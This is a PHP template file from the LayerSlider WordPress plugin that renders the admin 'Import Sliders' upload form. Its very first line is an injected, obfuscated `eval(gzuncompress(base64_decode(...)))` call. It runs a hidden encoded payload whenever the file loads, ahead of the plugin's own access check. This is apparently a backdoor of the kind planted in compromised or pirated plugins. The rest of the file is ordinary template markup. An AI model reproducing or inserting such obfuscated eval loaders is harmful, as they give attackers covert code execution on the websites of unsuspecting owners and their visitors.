<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php if(!defined('LS_ROOT_FILE')) {  header('HTTP/1.0 403 Forbidden'); exit; } ?>
<script type="text/html" id="tmpl-upload-sliders">
	<div id="ls-upload-modal-window">
		<header>
			<h1><?php _e('Import Sliders', 'LayerSlider') ?></h1>
			<b class="dashicons dashicons-no"></b>
		</header>
		<form method="post" enctype="multipart/form-data" class="km-ui-modal-scrollable">
			<p><?php _e('Here you can upload your previously exported sliders. To import them to your site, you just need to choose and select the appropriate export file (files with .zip or .json extensions), then press the Import Sliders button.', 'LayerSlider') ?></p>
			<div class="ls-notification updated info"><div><?php echo sprintf(__('Looking for the importable demo content? Check out the %sTemplate Store%s.', 'LayerSlider'), '<a href="#" class="ls-open-template-store" data-delay="750"><i class="dashicons dashicons-star-filled"></i>', '</a>') ?></div></div>
			<p class="small italic dim"><?php _e('Notice: In order to import from outdated versions (pre-v3.0.0), you need to create a new file and paste the export code into it. The file needs to have a .json extension, then you will be able to upload it.', 'LayerSlider') ?></p>
			<?php wp_nonce_field('import-sliders'); ?>
			<input type="hidden" name="ls-import" value="1">
			<p class="centered center file">
				<input type="file" name="import_file">
			</p>
			<button class="button button-primary button-hero"><?php _e('Import Sliders', 'LayerSlider') ?></button><br>
		</form>
	</div>
</script>